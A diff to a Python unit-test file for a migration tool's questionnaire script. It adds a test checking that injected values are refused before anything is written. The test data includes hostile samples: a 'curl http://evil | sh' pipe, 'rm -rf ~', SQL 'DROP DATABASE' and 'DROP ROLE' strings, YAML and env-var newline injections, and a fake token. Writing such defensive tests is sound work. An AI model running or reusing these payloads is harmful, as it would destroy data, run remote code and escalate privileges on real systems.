@@ -99,8 +99,8 @@ class Questionario(unittest.TestCase):
         self.assertEqual(r.returncode, 0, r.stderr)
         amb = self.tmp / ".wx-migration/ambiente"
         sql = (amb / "papeis-postgresql.sql").read_text()
-        self.assertIn("CREATE ROLE estoque_app LOGIN NOSUPERUSER PASSWORD '${ESTOQUE_APP_PASSWORD}';", sql)
-        self.assertIn("GRANT SELECT ON ALL TABLES IN SCHEMA public TO estoque_bi;", sql)
+        self.assertIn("CREATE ROLE \"estoque_app\" LOGIN NOSUPERUSER PASSWORD '${ESTOQUE_APP_PASSWORD}';", sql)
+        self.assertIn('GRANT SELECT ON ALL TABLES IN SCHEMA public TO "estoque_bi";', sql)
         env = (amb / ".env.exemplo").read_text()
         for l in env.splitlines():
             if l and not l.startswith("#"):
@@ -165,6 +165,38 @@ class Questionario(unittest.TestCase):
         (self.tmp / ".wx-migration/q4.json").write_text(json.dumps(q))
         r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/q4.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
         self.assertEqual(r.returncode, 2); self.assertIn("slack", r.stderr)
+
+    def test_injecao_no_questionario_e_recusada_antes_de_gravar(self):
+        """Valor do questionario vira bash com sudo, SQL de superusuario e YAML: tudo que nao e identificador e recusado."""
+        base = json.loads((self.tmp / ".wx-migration/questionario.json").read_text())
+        casos = [
+            ("0_empresa_e_projeto.0_15_github.diretorio_destino", '/tmp"; rm -rf ~ #', "0.15 diretorio_destino"),
+            ("0_empresa_e_projeto.0_15_github.credencial_ref", "X:-y", "credencial_ref"),
+            ("0_empresa_e_projeto.0_15_github.url", "https://github.com/a/b; curl http://evil | sh", "0.15 url"),
+            ("K_ambiente.K0_privilegios.usuario_root", "root; id #", "K0 usuario_root"),
+            ("K_ambiente.K2_postgresql.banco", "app; DROP DATABASE prod; --", "K2_postgresql banco"),
+            ("K_ambiente.K2_postgresql.papeis.0.nome", "u'; DROP ROLE postgres; --", "papel nome"),
+            ("K_ambiente.K2_postgresql.senha_ref", 'X}"; id #', "senha_ref"),
+            ("K_ambiente.K7_n8n.porta", '5678"]\n    privileged: true', "K7 porta"),
+            ("L_contexto_e_implantacao.L3_implantacao.variaveis_de_ambiente.0", "FOO=bar\n      - EVIL=1", "variavel de ambiente"),
+            ("K_ambiente.K2_postgresql.senha_do_banco", "hunter2", "senha_do_banco"),
+            ("0_empresa_e_projeto.0_1_softhouse.solicitacao", "token ghp_abcdefghijklmnopqrstuvwxyz0123456789", "formato de token"),
+        ]
+        for caminho, valor, trecho in casos:
+            q = json.loads(json.dumps(base)); cur = q; partes = caminho.split(".")
+            for k in partes[:-1]:
+                cur = cur[int(k)] if isinstance(cur, list) else cur[k]
+            if isinstance(cur, list): cur[int(partes[-1])] = valor
+            else: cur[partes[-1]] = valor
+            (self.tmp / ".wx-migration/qx.json").write_text(json.dumps(q))
+            t2 = Path(tempfile.mkdtemp()); shutil.copytree(EXEMPLO / "inputs", t2 / "inputs"); (t2 / ".wx-migration").mkdir()
+            shutil.copy(self.tmp / ".wx-migration/qx.json", t2 / ".wx-migration/questionario.json")
+            r = run(SCRIPTS / "aplicar_questionario.py", "--questionario", t2 / ".wx-migration/questionario.json", "--project-root", t2, "--plugin-root", RAIZ)
+            self.assertEqual(r.returncode, 2, f"{caminho} deveria ser recusado: {r.stdout[-200:]}")
+            self.assertIn(trecho, r.stderr, caminho)
+            self.assertFalse((t2 / ".wx-migration/ambiente").exists(), caminho); self.assertFalse((t2 / "CLAUDE.md").exists(), caminho)
+            self.assertNotIn("hunter2", r.stderr + r.stdout)
+            shutil.rmtree(t2, ignore_errors=True)
 
     def test_verificar_ambiente_mede_e_devolve_3_quando_falta(self):
         q = {"K_ambiente": {"K1_rust": {"instalar_ou_atualizar": True, "versao_minima": "999.0"}, "K6_github": {"ligar_projeto": True}}}
